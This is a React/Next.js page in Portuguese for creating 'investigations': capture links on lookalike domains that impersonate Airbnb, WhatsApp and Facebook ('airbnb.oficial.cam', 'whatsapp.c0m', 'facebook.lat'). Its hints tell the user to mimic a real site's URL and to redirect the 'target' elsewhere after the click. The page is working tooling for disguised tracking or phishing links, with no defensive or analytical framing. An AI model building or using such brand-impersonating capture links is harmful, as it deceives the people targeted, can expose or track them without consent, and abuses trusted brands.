"use client";

import Input from "../components/input";
import TextField from "../components/textfield";
import Button from "../components/button";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { supabase } from "@/lib/supabase-client";
import SuccessModal from "../components/success-modal";

export default function Register() {
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [url, setUrl] = useState<string>("");

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    defaultValues: {
      name: "",
      description: "",
      domain: "airbnb.oficial.cam",
      access: 0,
      active: true,
      url_path: "",
      url_redirect: "",
    },
  });

  const onSubmit = async ({
    name,
    description,
    domain,
    url_path,
    url_redirect,
    access,
    active,
  }: {
    name: string;
    description: string;
    domain: string;
    url_path: string;
    url_redirect: string;
    access: number;
    active: boolean;
  }) => {
    try {
      console.log("Enviando dados para o banco...");

      const { error: supabaseError } = await supabase
        .from("investigations")
        .insert({
          name,
          description,
          domain,
          url_path,
          url_redirect,
          access,
          active,
        })
        .single();

      if (supabaseError) throw supabaseError;

      setUrl(`${domain}/${url_path}`);

      setIsModalOpen(true);
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
    }
  };

  const domains = [
    {
      value: "airbnb.oficial.cam",
      label: "airbnb.oficial.cam",
      icon: "/airbnb.svg",
    },
    { value: "whatsapp.c0m", label: "whatsapp.c0m", icon: "/zap.svg" },
    { value: "facebook.lat", label: "facebook.lat", icon: "/face.svg" },
  ];

  return (
    <div className="flex flex-col flex-grow items-center text-[var(--white)]">
      <div className="w-2/5 min-w-[24rem] mt-10">
        <h1 className="text-3xl mb-10">Nova Investigação</h1>
        <form onSubmit={handleSubmit(onSubmit)}>
          <Input
            {...register("name", {
              required: "Nome é obrigatório!",
            })}
            label="Como quer chamar sua nova investigação?"
            placeholder="Dê um nome para a sua investigação"
            errorMessage={errors.name?.message}
          />
          <TextField
            {...register("description")}
            label="Qual o objetivo dessa investigação (opccional)"
            placeholder="Descreva o objetivo dessa investigação"
            className="mt-5"
          />
          <div className="flex w-full items-center gap-2 mt-5">
            <div className="flex-1 h-36">
              <p className="mb-2 text-[var(--white)]">Selecione um domínio</p>
              <select
                {...register("domain")}
                className="mt-2 w-full rounded-[6px] border-2 border-[var(--blue)] bg-zinc-900 p-1"
              >
                {domains.map((item) => (
                  <option
                    key={item.value}
                    value={item.value}
                    className="flex items-center gap-2"
                  >
                    {item.label}
                  </option>
                ))}
              </select>
            </div>
            <p className="h-12">/</p>
            <div className="flex-1 h-36">
              <Input
                {...register("url_path", {
                  required: "Url obrigatória!",
                })}
                label="Personalize a URL"
                helperText={
                  errors.url_path ? "" : "Dica: Simule a URL de um site real."
                }
                placeholder="Sugestão-url"
                errorMessage={errors.url_path?.message}
              />
            </div>
          </div>
          <Input
            {...register("url_redirect", {
              required: "Url de redirecionamento obrigatória!",
            })}
            label="Para onde deseja redirecionar o alvo?"
            placeholder="www.google.com"
            helperText={
              errors.url_redirect
                ? ""
                : "Dpois de clicar no link de captura, o alvo será redirecionado para o site acima"
            }
            errorMessage={errors.url_redirect?.message}
          />
          <div className="w-full flex justify-end mt-10">
            <Button type="submit">Criar investigação</Button>
          </div>
        </form>
      </div>

      <SuccessModal link={url} open={isModalOpen} />
    </div>
  );
}
